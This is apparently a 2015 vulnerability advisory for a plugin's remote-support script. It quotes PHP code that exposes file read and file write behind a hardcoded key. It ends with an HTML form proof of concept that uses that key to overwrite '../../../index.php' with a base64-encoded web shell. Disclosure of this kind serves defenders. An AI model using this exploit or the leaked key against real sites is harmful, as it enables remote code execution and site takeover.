File Upload & LFD
Link:
Version: 7.0

This Plugin is Vulnerable to Local File Disclosure and Remote Code Execute
via Arbitrary File Upload.

Vulnerability Code(Shorted):
class abmRemoteSupport{

    public function __construct(){
        $this->load_config();
        $this->validate_connection();
        $this->triggers();
    }

    private function load_config(){
        require_once( &#039;remote_init.php&#039; );
        $this->config = $aa_tunnel_config;

        /*  in remote_init.php
        *    $aa_tunnel_config = array(
        *    "key" => "69efc4922575861f31125878597e97cf",
        *    );
        */
    }

    private function validate_connection(){
        $coming_key = isset($_REQUEST[&#039;connection_key&#039;]) ?
$_REQUEST[&#039;connection_key&#039;] : &#039;&#039;;
        if( trim($coming_key) == "" || $coming_key != $this->config[&#039;key&#039;]
){
            $this->print_error( array(&#039;code&#039; => 101,&#039;msg&#039; => "Invalid
key!"), &#039;fatal&#039; );
        }
        return true;
    }

    private function triggers(){
        $action = isset($_REQUEST[&#039;action&#039;]) ? $_REQUEST[&#039;action&#039;] : &#039;&#039;;
        if( $action == &#039;browse_folder&#039; )
            $this->browse_folder();
        if( $action == &#039;open_file&#039; )
            $this->open_file();
        if( $action == &#039;save_file&#039; )
            $this->save_file();
        $this->print_response();
    }

    private function save_file(){
        $file = isset($_REQUEST[&#039;file&#039;]) ? urldecode($_REQUEST[&#039;file&#039;]) :
&#039;&#039;;
        $file_content = isset($_REQUEST[&#039;file_content&#039;]) ?
@base64_decode($_REQUEST[&#039;file_content&#039;]) : &#039;&#039;;
        if( file_exists( $file )) {
            $write_file = @file_put_contents( $file, $file_content );
            if( $write_file ){
                $this->response = array(&#039;status&#039; => &#039;valid&#039;,&#039;file_path&#039; =>
$file,&#039;file_type&#039; => end( explode(".", $file ) ));
            }else{
                $this->response = array(&#039;status&#039; => &#039;invalid&#039;,&#039;msg&#039; =>
&#039;Unable to write on file&#039;,&#039;file_type&#039; => end( explode(".", $file ) ),
&#039;file_path&#039; => $file);
            }
        }
    }

    private function open_file()
    {
        $file = isset($_REQUEST[&#039;file&#039;]) ? $this->config[&#039;path&#039;] .
$_REQUEST[&#039;file&#039;] : &#039;&#039;;
        if( file_exists( $file ) ) {
            $file_content = file_get_contents( $file );
            $this->response = array(
                &#039;status&#039; => &#039;valid&#039;,
                &#039;file_path&#039; => $file,
                &#039;file_type&#039; => end( explode(".", $file ) ),
                &#039;file_name&#039; => end( explode("/", $file ) ),
                &#039;file_alias&#039; => md5( $file ),
                &#039;content&#039; => $file_content
            );
        }
    }

    new abmRemoteSupport();
Vulnerable Code End.

so as you see it using authenication! in &#039;validate_connection&#039; function its
validating connection through checking the requested key with the defined
one ($this->config[&#039;key&#039;]). the pass is an md5 value
&#039;69efc4922575861f31125878597e97cf&#039; but when authenicating its comparing
$_REQUEST[&#039;connection_key&#039;] with &#039;69efc4922575861f31125878597e97cf&#039;
Directly without encoding the requested key in md5. so it can be directly
passed by passing the original value &#039;69efc4922575861f31125878597e97cf&#039;.

Conclusion: &#039;remote_tunnel.php&#039;?!! this looks a suspicious name though! its
confusing if the vendor did this on purpose or not, because there is
protections in other methods.

Proof of Concept:
<form action="
method="post" >
    <input type="hidden" name="connection_key"
value="69efc4922575861f31125878597e97cf" >
    <input name="action" value="save_file" ><br>
    <input name="file" value="../../../index.php"><br>
    <textarea name="file_content" >BASE64 ENCODED SHELL</textarea><br>
    <input type="submit" ><br>
</form>

Timeline:
Discovered - March 2015
Vendor Contact - March 2015
No Reply - April 2015
Public Disclosure - April 2015

